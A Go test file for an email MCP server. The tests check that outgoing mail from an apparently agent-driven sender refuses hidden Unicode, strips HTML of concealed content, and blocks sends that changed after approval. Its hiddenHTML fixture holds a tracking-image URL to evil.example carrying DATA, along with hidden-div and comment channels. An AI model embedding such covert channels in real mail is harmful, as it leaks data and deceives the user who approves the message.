package service

import (
	"bytes"
	"fmt"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/stretchr/testify/require"

	"github.com/EmadMokhtar/email-mcp-go/internal/audit"
	"github.com/EmadMokhtar/email-mcp-go/internal/confirm"
	"github.com/EmadMokhtar/email-mcp-go/internal/domain/account"
	"github.com/EmadMokhtar/email-mcp-go/internal/domain/mail"
	"github.com/EmadMokhtar/email-mcp-go/internal/mime"
)

const (
	spaceWithNoWidth = "\U0000200B"
	tagLetterA       = "\U000E0041"
	// hiddenHTML holds data in each place that a preview cannot show.
	hiddenHTML = `<p>Thanks, received.</p><img src="https://evil.example/p.gif?d=DATA">` +
		`<div style="display:none">DATA</div><!-- DATA --><p data-x="DATA" style="color:red">Bye.</p>`
)

// sentParts returns the text and the HTML of a built message.
func sentParts(t *testing.T, data []byte) *mime.Parsed {
	t.Helper()
	p, err := mime.ParseMessage(bytes.NewReader(data), 0)
	require.NoError(t, err)
	return p
}

// requireNoHiddenHTML checks that nothing of hiddenHTML left but what is shown.
func requireNoHiddenHTML(t *testing.T, p *mime.Parsed) {
	t.Helper()
	require.NotContains(t, p.HTML, "DATA")
	require.NotContains(t, p.Text, "DATA")
	for _, part := range []string{"<img", "<!--", "<style", "style=", "data-x"} {
		require.NotContains(t, p.HTML, part)
	}
	require.Contains(t, p.HTML, "Thanks, received.")
	text, err := mime.HTMLToText(p.HTML)
	require.NoError(t, err)
	require.Equal(t, text, mime.CleanUntrusted(p.Text), "the text part is the text of the HTML")
}

// A message with text that a confirmation could not show is refused before the
// user is asked, on every path.
func TestSendRefusesHiddenText(t *testing.T) {
	paths := map[string]struct {
		mode   ConfirmMode
		change []func(*account.Account)
	}{
		"in band":         {ConfirmInBand, nil},
		"web page":        {ConfirmFallback, nil},
		"no confirmation": {ConfirmInBand, []func(*account.Account){autonomy}},
	}
	fields := map[string]func(c *mail.Compose){
		"subject":        func(c *mail.Compose) { c.Subject = "Plans" + tagLetterA },
		"body":           func(c *mail.Compose) { c.Body = "See you" + spaceWithNoWidth },
		"a name in to":   func(c *mail.Compose) { c.To = []string{"Bo" + spaceWithNoWidth + "b <bob@example.com>"} },
		"a name in cc":   func(c *mail.Compose) { c.Cc = []string{"Ca" + tagLetterA + "rol <carol@example.com>"} },
		"a name in bcc":  func(c *mail.Compose) { c.Bcc = []string{"Dan" + spaceWithNoWidth + " <dan@example.com>"} },
		"a blank letter": func(c *mail.Compose) { c.Subject = "Plans\U00002800" },
	}
	for pathName, path := range paths {
		for fieldName, set := range fields {
			t.Run(pathName+"/"+fieldName, func(t *testing.T) {
				env := newWriteEnv(t)
				a := env.account(path.change...)
				c := compose("bob@example.com")
				set(&c)

				res, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, path.mode, nil)

				require.ErrorIs(t, err, mime.ErrHiddenText)
				require.True(t, isMessageError(err), "it is an error of the request")
				require.Nil(t, res)
				require.Nil(t, needs)
				env.requireNothingQueued()
				requireEntry(t, env.lastEntry(), "send_message", audit.OutcomeRefused, "invalid_request")
			})
		}
	}
}

// A draft cannot carry what a direct send cannot.
func TestCreateDraftRefusesHiddenText(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account(level(account.MailDraft))
	for _, c := range []mail.Compose{
		{Subject: "Plans" + tagLetterA},
		{Body: "See you" + spaceWithNoWidth},
		{To: []string{"Bo" + spaceWithNoWidth + "b <bob@example.com>"}},
	} {
		_, err := env.svc.CreateDraft(env.ctx(), a.ID, c)
		require.ErrorIs(t, err, mime.ErrHiddenText)
		requireEntry(t, env.lastEntry(), "create_draft", audit.OutcomeRefused, "invalid_request")
	}
	require.Empty(t, env.backend.saved)
}

func TestHTMLIsCleanedBeforeItLeaves(t *testing.T) {
	c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", HTMLBody: hiddenHTML}

	t.Run("a send that the user confirms", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Thanks, received.\n\nBye.", needs.Pending.Preview.BodyStart)
		require.Zero(t, needs.Pending.Preview.BodyMore, "nothing else goes out")

		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)
		requireNoHiddenHTML(t, sentParts(t, env.sender.sent()[0].Msg.Data))
	})

	t.Run("a send on the web page", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()

		res, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmFallback, nil)
		require.NoError(t, err)
		require.NoError(t, env.svc.ApprovePending(env.webCtx(), res.SendID))
		requireNoHiddenHTML(t, sentParts(t, env.sender.sent()[0].Msg.Data))
	})

	t.Run("a send with no confirmation", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account(autonomy, func(a *account.Account) { a.Limits.UndoWindowAuto = 0 })

		_, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		requireNoHiddenHTML(t, sentParts(t, env.sender.sent()[0].Msg.Data))
	})

	t.Run("a draft", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()

		_, err := env.svc.CreateDraft(env.ctx(), a.ID, c)
		require.NoError(t, err)
		requireNoHiddenHTML(t, sentParts(t, env.backend.saved[0].Data))

		// The saved draft goes out as it is, and the preview shows all of it.
		env.backend.addMessage("d1", env.backend.saved[0].Data, true)
		draft := mail.Ref("d1")
		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Thanks, received.\n\nBye.", needs.Pending.Preview.BodyStart)
		require.Zero(t, needs.Pending.Preview.BodyMore)
	})
}

// What the original says is cleaned, not refused, so a reply and a forward work
// for a message with a hidden character.
func TestAReplyAndAForwardOfHiddenTextGoOut(t *testing.T) {
	const hidden = spaceWithNoWidth + tagLetterA
	dirty := func() *mail.Message {
		o := original()
		o.Subject = "Lu" + hidden + "nch"
		o.From = mail.Address{Name: "Ali" + hidden + "ce", Email: "alice@example.com"}
		o.Text = "See" + hidden + " you"
		o.Date = testStart
		return o
	}

	t.Run("a reply", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		env.backend.originals["o1"] = dirty()
		c := mail.Compose{ReplyTo: &mail.ReplyRef{Ref: "o1"}, Body: "Yes."}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Re: Lunch", needs.Pending.Preview.Subject)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)

		data := string(env.sender.sent()[0].Msg.Data)
		require.Contains(t, data, "Subject: Re: Lunch")
		require.Zero(t, mime.HiddenRunes(data))
	})

	t.Run("a forward", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		env.backend.originals["o1"] = dirty()
		ref := mail.Ref("o1")
		c := mail.Compose{ForwardOf: &ref, To: []string{"bob@example.com"}, Body: "FYI"}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Fwd: Lunch", needs.Pending.Preview.Subject)
		require.Zero(t, needs.Pending.Preview.BodyMore)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)

		p := sentParts(t, env.sender.sent()[0].Msg.Data)
		require.Contains(t, p.Text, "See you")
		require.Zero(t, mime.HiddenRunes(p.Text))
	})
}

// A person may write a draft in another mail program, with styles and images.
// It goes out as it was saved. The preview says what it cannot show.
func TestADraftFromAnotherProgramGoesOutAsItWasSaved(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	raw := draftWithHTML(`<p style="color:red">Hello` + spaceWithNoWidth + `</p><img src="https://example.com/logo.png"><!-- note -->`)
	raw = bytes.Replace(raw, []byte("Subject: Two bodies"), []byte("Subject: Two"+spaceWithNoWidth+" bodies"), 1)
	env.backend.addMessage("d1", raw, true)
	draft := mail.Ref("d1")

	_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)
	require.NoError(t, err)
	require.Equal(t, "Two bodies", needs.Pending.Preview.Subject)
	require.Equal(t, "Hello", needs.Pending.Preview.BodyStart)
	require.Equal(t, 1, needs.Pending.Preview.BodyMore, "the hidden character of the HTML is counted")

	_, _, err = env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, accept(needs))
	require.NoError(t, err)
	require.Equal(t, string(raw), string(env.sender.sent()[0].Msg.Data))
}

// BodyMore says how much of the text that goes out the preview does not show.
func TestPreviewCountsTheRawText(t *testing.T) {
	for name, tc := range map[string]struct {
		body  string
		start string
		more  int
	}{
		"a short text":                  {"Hello", "Hello", 0},
		"a line break at the end":       {"Hello\r\n\r\n", "Hello", 0},
		"a line break at the start":     {"\n\nHello", "Hello", 0},
		"a normal text":                 {"Hello Bob,\n\nSee you.\n", "Hello Bob,\n\nSee you.", 0},
		"padding inside the text":       {"a" + strings.Repeat(" ", 600) + "b", "a b", 599},
		"white space at the end":        {"a" + strings.Repeat(" \t", 50), "a", 100},
		"line breaks inside the text":   {"a" + strings.Repeat("\n", 100) + "b", "a\n\nb", 98},
		"indented lines":                {"a\n    b", "a\nb", 4},
		"text after the preview":        {strings.Repeat("x", 600), strings.Repeat("x", 500), 100},
		"padding after the preview too": {strings.Repeat("x", 600) + "    y", strings.Repeat("x", 500), 100 + 2 + 3},
	} {
		t.Run(name, func(t *testing.T) {
			env := newWriteEnv(t)
			a := env.account()
			c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", Body: tc.body}

			_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

			require.NoError(t, err)
			require.Equal(t, tc.start, needs.Pending.Preview.BodyStart)
			require.Equal(t, tc.more, needs.Pending.Preview.BodyMore)
		})
	}
}

// A draft that a person wrote can hold hidden characters. They do not fill the
// preview, and the preview counts them.
func TestDraftPreviewCountsHiddenCharacters(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	text := strings.Repeat(spaceWithNoWidth, 21000) + "Wire the money today."
	raw := strings.Replace(string(draftMail("me@example.com")), "Draft body\r\n", text, 1)
	env.backend.addMessage("d1", []byte(raw), true)
	draft := mail.Ref("d1")

	_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

	require.NoError(t, err)
	require.Equal(t, "Wire the money today.", needs.Pending.Preview.BodyStart)
	require.Equal(t, 21000, needs.Pending.Preview.BodyMore)
	require.Equal(t, fmt.Sprintf("… and %d more characters not shown", 21000), needs.Pending.Preview.MoreCharsText())
}

// The preview shows the start of the text. A change further on is still a change
// of the message that the user approved.
func TestAChangeThatThePreviewDoesNotShowIsAChangedMessage(t *testing.T) {
	t.Run("the text of a forward, after the part that is shown", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		first := strings.Repeat("x", 800)
		env.backend.nextOriginal = func(_ mail.Ref, call int) *mail.Message {
			o := original()
			o.Text = first
			if call > 1 {
				o.Text = first[:799] + "y"
			}
			return o
		}
		ref := mail.Ref("o1")
		c := mail.Compose{ForwardOf: &ref, To: []string{"bob@example.com"}, Body: "FYI"}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	t.Run("a draft, in a part that the preview never shows", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		raw := draftWithHTML(`<p>Hello</p><!-- one -->`)
		env.backend.addMessage("d1", raw, true)
		draft := mail.Ref("d1")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)
		require.NoError(t, err)
		env.backend.addMessage("d1", bytes.Replace(raw, []byte("one"), []byte("two"), 1), true)
		_, _, err = env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	t.Run("the same message gives the same hash", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", HTMLBody: "<p>Hello</p>"}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.NotEmpty(t, needs.Pending.Preview.BodyHash)
		require.True(t, utf8.ValidString(needs.Pending.Preview.BodyHash))

		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err, "a new Message-ID and a new boundary change nothing")
	})

	t.Run("the bytes of a forwarded attachment", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := forwardWithAttachments(env.backend, "plan.pdf")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		env.backend.attachments["2"].Data = []byte("PDF")
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	t.Run("a display name, after the part that is shown", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		long := strings.Repeat("n", 150)
		env.backend.nextOriginal = func(_ mail.Ref, call int) *mail.Message {
			o := original()
			o.From.Name = long
			if call > 1 {
				o.From.Name = long[:149] + "m"
			}
			return o
		}
		c := mail.Compose{ReplyTo: &mail.ReplyRef{Ref: "o1"}, Body: "Yes."}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	require.False(t, samePreview(confirm.Preview{BodyHash: "a"}, confirm.Preview{BodyHash: "b"}))
	require.False(t, samePreview(confirm.Preview{}, confirm.Preview{BodyHash: "b"}), "a stored preview without a hash does not match")
}

// The preview names an attachment by the name that goes out. A cleaned name of
// the original is the same in both places.
func TestForwardedAttachmentNameInThePreviewIsTheNameThatIsSent(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	c := forwardWithAttachments(env.backend,
		"\U00000645\U000006CC\U0000200C\U00000631.pdf", // Persian with ZWNJ
		"a\U0000200Cb.pdf", // ZWNJ between Latin letters
		"two\U00002028lines.pdf",
		"plan"+spaceWithNoWidth+tagLetterA+".pdf",
		spaceWithNoWidth, // nothing is left of this name
	)

	_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
	require.NoError(t, err)
	_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
	require.NoError(t, err)

	var sent []string
	for _, att := range sentParts(t, env.sender.sent()[0].Msg.Data).Attachments {
		sent = append(sent, att.Filename)
	}
	require.Equal(t, []string{
		"\U00000645\U000006CC\U0000200C\U00000631.pdf", "ab.pdf", "two lines.pdf", "plan.pdf", "attachment", "own.txt",
	}, sent)
	require.Equal(t, sent, needs.Pending.Preview.Attachments)
}

// A draft with HTML sends its text part too, so the count holds the hidden
// characters of both parts.
func TestDraftCountsTheHiddenCharactersOfBothParts(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	raw := draftWithHTML(`<p>Hello` + strings.Repeat(spaceWithNoWidth, 2) + `</p>`)
	raw = bytes.Replace(raw, []byte("Harmless"), []byte("Harm"+strings.Repeat(tagLetterA, 5)+"less"), 1)
	env.backend.addMessage("d1", raw, true)
	draft := mail.Ref("d1")

	_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

	require.NoError(t, err)
	require.Equal(t, "Hello", needs.Pending.Preview.BodyStart)
	require.Equal(t, 7, needs.Pending.Preview.BodyMore)
}

// A draft in a multipart/mixed shows its text part and its HTML part both (see
// mime.LayoutOf). Each of them can hold hidden characters, and the count holds
// both, also with padding in the text part. This joins the rule for the shown
// parts with the rule that the preview counts what it does not show.
func TestDraftCountsWhatIsHiddenInEveryShownPart(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	env.backend.addMessage("d1", crlf("From: Me <me@example.com>\n"+
		"To: Ann <ann@example.com>\n"+
		"Subject: Two parts\n"+
		"MIME-Version: 1.0\n"+
		"Content-Type: multipart/mixed; boundary=\"A\"\n"+
		"\n"+
		"--A\n"+
		"Content-Type: text/plain; charset=utf-8\n"+
		"\n"+
		"Pay"+strings.Repeat(spaceWithNoWidth, 3)+" now.\n"+
		"--A\n"+
		"Content-Type: text/html; charset=utf-8\n"+
		"\n"+
		"<p>Kind"+strings.Repeat(tagLetterA, 2)+" regards</p>\n"+
		"--A--\n"), true)
	draft := mail.Ref("d1")

	_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

	require.NoError(t, err)
	require.Equal(t, "Pay now.\n\nKind regards", needs.Pending.Preview.BodyStart)
	require.Equal(t, 5, needs.Pending.Preview.BodyMore, "3 and 2 hidden characters, none counted twice")
}

// The detail page shows the whole text with its white space, so only what it
// cannot show is counted there.
func TestPendingDetailCountsWhatItCannotShow(t *testing.T) {
	t.Run("a draft with hidden characters", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		raw := strings.Replace(string(draftMail("me@example.com")), "Draft body", "Draft"+strings.Repeat(spaceWithNoWidth, 3)+" body", 1)
		env.backend.addMessage("d1", []byte(raw), true)
		draft := mail.Ref("d1")
		res, _, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmFallback, nil)
		require.NoError(t, err)

		_, detail, err := env.svc.PendingDetail(env.webCtx(), res.SendID)

		require.NoError(t, err)
		require.Equal(t, "… and 3 more characters not shown", detail.MoreChars)
	})

	t.Run("padding is on the page", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", Body: "a" + strings.Repeat(" ", 50) + "b"}
		res, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmFallback, nil)
		require.NoError(t, err)

		p, detail, err := env.svc.PendingDetail(env.webCtx(), res.SendID)

		require.NoError(t, err)
		require.Equal(t, 49, p.Preview.BodyMore)
		require.Empty(t, detail.MoreChars)
		require.Contains(t, detail.Body, strings.Repeat(" ", 50))
	})
}

func TestSendRefusesHTMLWithNothingToShow(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", HTMLBody: `<img src="https://example.com/logo.png">`}

	_, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

	require.ErrorIs(t, err, mime.ErrEmptyHTML)
	require.True(t, isMessageError(err))
	env.requireNothingQueued()
	requireEntry(t, env.lastEntry(), "send_message", audit.OutcomeRefused, "invalid_request")
}

func TestPreviewShowsTheDisplayNames(t *testing.T) {
	t.Run("in to, cc and bcc", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{
			To:      []string{"Bob Smith <bob@example.com>", "ann@example.com"},
			Cc:      []string{"Carol <carol@example.com>"},
			Bcc:     []string{`"Dan, the boss" <dan@example.com>`},
			Subject: "S", Body: "hi",
		}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

		require.NoError(t, err)
		p := needs.Pending.Preview
		require.Equal(t, []string{"bob@example.com", "ann@example.com", "carol@example.com", "dan@example.com"}, p.To)
		require.Equal(t, []string{"Bob Smith", "", "Carol", "Dan, the boss"}, p.Names)
		require.Zero(t, p.NamesMore)
		require.Equal(t, []string{
			`bob@example.com ("Bob Smith")`, "ann@example.com", `carol@example.com ("Carol")`, `dan@example.com ("Dan, the boss")`,
		}, p.Recipients())
	})

	t.Run("no names means no list", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := compose("bob@example.com")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

		require.NoError(t, err)
		require.Nil(t, needs.Pending.Preview.Names)
		require.Equal(t, []string{"bob@example.com"}, needs.Pending.Preview.Recipients())
	})

	t.Run("a long name is cut and counted", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{
			To:      []string{strings.Repeat("n", 130) + " <bob@example.com>", strings.Repeat("m", 110) + " <ann@example.com>"},
			Subject: "S", Body: "hi",
		}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

		require.NoError(t, err)
		p := needs.Pending.Preview
		require.Equal(t, []string{strings.Repeat("n", 100) + "...", strings.Repeat("m", 100) + "..."}, p.Names)
		require.Equal(t, 40, p.NamesMore)
		require.Equal(t, "… and 40 more characters of display names not shown", p.MoreNamesText())
	})

	t.Run("a reply to all shows the names of the original, cleaned", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		o := original()
		o.From.Name = "Ali" + spaceWithNoWidth + "ce"
		o.To = []mail.Address{{Name: strings.Repeat("d", 120), Email: "dan@example.com"}, {Email: "me@example.com"}}
		env.backend.originals["o1"] = o
		c := mail.Compose{ReplyTo: &mail.ReplyRef{Ref: "o1", All: true}, Body: "Yes."}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

		require.NoError(t, err)
		p := needs.Pending.Preview
		require.Equal(t, []string{"alice@example.com", "dan@example.com", "erin@example.com"}, p.To)
		require.Equal(t, []string{"Alice", strings.Repeat("d", 100) + "...", ""}, p.Names)
		require.Equal(t, 20, p.NamesMore)
	})

	t.Run("a draft shows the names of its headers", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		raw := strings.Replace(string(draftMail("me@example.com")), "Bcc: hidden@example.com", "Bcc: Hid"+spaceWithNoWidth+"den <hidden@example.com>", 1)
		env.backend.addMessage("d1", []byte(raw), true)
		draft := mail.Ref("d1")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

		require.NoError(t, err)
		require.Equal(t, []string{"Ann", "Hidden"}, needs.Pending.Preview.Names)
		require.Equal(t, 1, needs.Pending.Preview.NamesMore, "the hidden character is counted")
	})

	t.Run("the detail page shows them too", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{To: []string{"Bob <bob@example.com>", strings.Repeat("n", 105) + " <ann@example.com>"}, Subject: "S", Body: "hi"}
		res, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmFallback, nil)
		require.NoError(t, err)

		_, detail, err := env.svc.PendingDetail(env.webCtx(), res.SendID)

		require.NoError(t, err)
		require.Equal(t, []string{`bob@example.com ("Bob")`, `ann@example.com ("` + strings.Repeat("n", 100) + `...")`}, detail.Recipients)
		require.Equal(t, "… and 5 more characters of display names not shown", detail.MoreNames)
	})
}

func TestPreviewShowsTheAttachmentTypes(t *testing.T) {
	png := append([]byte("\x89PNG\r\n\x1a\n"), make([]byte, 40)...)

	t.Run("a new message, with a type that is found from the data", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", Body: "hi", Attachments: []mail.OutgoingAttachment{
			{Filename: "report.pdf", ContentType: "application/pdf; x-note=y", Data: []byte("%PDF-1.4")},
			{Filename: "pic.png", Data: png},
		}}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		p := needs.Pending.Preview
		require.Equal(t, []string{"report.pdf", "pic.png"}, p.Attachments)
		require.Equal(t, []string{"application/pdf", "image/png"}, p.AttachmentTypes)
		require.Equal(t, []string{"report.pdf (application/pdf)", "pic.png (image/png)"}, p.AttachmentLines())

		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)
		var sent []string
		for _, att := range sentParts(t, env.sender.sent()[0].Msg.Data).Attachments {
			sent = append(sent, att.ContentType)
		}
		require.Equal(t, sent, p.AttachmentTypes, "the preview shows the type that is sent")
	})

	t.Run("a forward shows the type of the original", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := forwardWithAttachments(env.backend, "plan.pdf")
		env.backend.attachments["2"].ContentType = "application/" + strings.Repeat("x", mime.MaxMediaTypeBytes)

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

		require.NoError(t, err)
		require.Equal(t, []string{"application/octet-stream", "text/plain"}, needs.Pending.Preview.AttachmentTypes)
	})

	t.Run("a type that the agent gives is shown whole", func(t *testing.T) {
		longest := "application/" + strings.Repeat("x", mime.MaxMediaTypeBytes-len("application/"))
		for _, mediaType := range []string{longest, "application/vnd.openxmlformats-officedocument.presentationml.presentation"} {
			env := newWriteEnv(t)
			a := env.account()
			c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", Body: "hi", Attachments: []mail.OutgoingAttachment{
				{Filename: "a.bin", ContentType: mediaType, Data: []byte("x")},
			}}

			_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

			require.NoError(t, err)
			require.Equal(t, []string{mediaType}, needs.Pending.Preview.AttachmentTypes)
		}
	})

	t.Run("a draft shows the type of its header", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		env.backend.addMessage("d1", draftWithAttachment(""), true)
		draft := mail.Ref("d1")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

		require.NoError(t, err)
		p := needs.Pending.Preview
		require.Equal(t, []string{"notes.pdf"}, p.Attachments)
		require.Equal(t, []string{"application/pdf"}, p.AttachmentTypes)
	})

	t.Run("no attachments means no list", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := compose("bob@example.com")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

		require.NoError(t, err)
		require.Nil(t, needs.Pending.Preview.AttachmentTypes)
		require.Empty(t, needs.Pending.Preview.AttachmentLines())
	})

	t.Run("a long type of a draft is cut", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		long := "application/" + strings.Repeat("x", 120)
		raw := bytes.Replace(draftWithAttachment(""), []byte("application/pdf"), []byte(long), 1)
		env.backend.addMessage("d1", raw, true)
		draft := mail.Ref("d1")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

		require.NoError(t, err)
		require.Equal(t, []string{long[:mime.MaxMediaTypeBytes] + "..."}, needs.Pending.Preview.AttachmentTypes)
	})

	t.Run("the detail page shows the type next to the name", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", Body: "hi", Attachments: []mail.OutgoingAttachment{
			{Filename: "pic.png", Data: png},
		}}
		res, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmFallback, nil)
		require.NoError(t, err)

		_, detail, err := env.svc.PendingDetail(env.webCtx(), res.SendID)

		require.NoError(t, err)
		require.Equal(t, []string{"pic.png (image/png)"}, detail.Attachments)
	})

	t.Run("a changed type is a changed message", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := forwardWithAttachments(env.backend, "plan.pdf")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		env.backend.attachments["2"].ContentType = "application/x-msdownload"
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	require.False(t, samePreview(confirm.Preview{AttachmentTypes: []string{"a/b"}}, confirm.Preview{AttachmentTypes: []string{"a/c"}}))
	require.False(t, samePreview(confirm.Preview{AttachmentTypes: []string{"a/b"}}, confirm.Preview{}))
}

func TestSamePreviewComparesTheDisplayNames(t *testing.T) {
	named := func(to []string, names ...string) confirm.Preview { return confirm.Preview{To: to, Names: names} }
	both := []string{"a@example.com", "b@example.com"}

	require.True(t, samePreview(named(both, "Ann", "Bob"), named(both, "Ann", "Bob")))
	require.False(t, samePreview(named(both, "Ann", "Bob"), named(both, "Ann", "Eve")))
	require.False(t, samePreview(named(both, "Ann", ""), named(both, "", "Ann")), "the name of another recipient")
	require.False(t, samePreview(named(both, "Ann", "Bob"), confirm.Preview{To: both}))
	require.True(t, samePreview(named(both, "Ann", "Bob"), named([]string{"B@example.com", "a@example.com"}, "Bob", "Ann")),
		"recipients are compared without case and order")
	require.False(t, samePreview(confirm.Preview{NamesMore: 1}, confirm.Preview{NamesMore: 2}))
}
